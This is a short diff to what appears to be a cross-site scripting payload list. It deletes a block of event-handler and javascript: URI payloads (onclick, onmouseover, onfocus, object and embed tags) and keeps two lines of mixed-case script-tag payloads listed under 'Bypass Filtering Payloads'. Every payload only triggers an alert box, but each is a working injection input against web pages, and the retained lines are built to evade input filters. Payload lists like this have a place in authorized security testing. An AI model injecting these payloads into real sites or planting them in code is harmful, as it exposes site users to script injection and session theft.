@@ -1,12 +1,3 @@
-# Event-Based XSS Payloads
-<a href="javascript:alert('XSS')">Click Me</a>
-<button onclick="alert('XSS')">Click Me</button>
-<div onmouseover="alert('XSS')">Hover Me</div>
-<input type="text" onfocus="alert('XSS')">
-<form onsubmit="alert('XSS')"><input type="submit"></form>
-<object data="javascript:alert('XSS')"></object>
-<embed src="javascript:alert('XSS')">
-<select onchange="alert('XSS')"><option>Option</option></select>
 # Bypass Filtering Payloads
 "><ScRiPt>alert('XSS')</sCriPt>
 "><sCrIpT>alert('XSS')</ScRipt>
